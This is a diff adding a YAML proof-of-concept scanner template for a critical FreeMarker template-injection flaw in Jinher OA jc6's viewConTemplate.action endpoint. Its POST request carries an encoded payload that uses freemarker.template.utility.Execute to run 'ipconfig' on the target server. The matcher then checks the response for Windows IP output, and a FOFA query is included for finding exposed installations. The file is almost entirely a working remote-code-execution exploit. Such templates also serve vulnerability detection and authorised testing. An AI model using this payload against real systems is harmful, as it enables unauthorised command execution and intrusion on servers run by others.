@@ -1,0 +1,25 @@
+id: poc-yaml-jinher-view-contemplate-action-freemarker-ssti
+info:
+  name: 金和OA jc6 viewConTemplate.action FreeMarker模板注入漏洞
+  severity: critical
+  tags:
+  - ssti
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+requests:
+- method: POST
+  path: /jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: moduId=1&code=%253Cclob%253E%2524%257B%2522freemarker.template.utility.Execute%2522%253Fnew%28%29%28%2522ipconfig%2522%29%257D%253C%252Fclob%253E&uuid=1
+  expression: 'status_code == 200 &&
+
+    contains(body,"Windows IP 配置") &&
+
+    contains(body,"IPv4 地址") &&
+
+    contains(body,"DNS")
+
+    '
+variables: {}
+transport: http
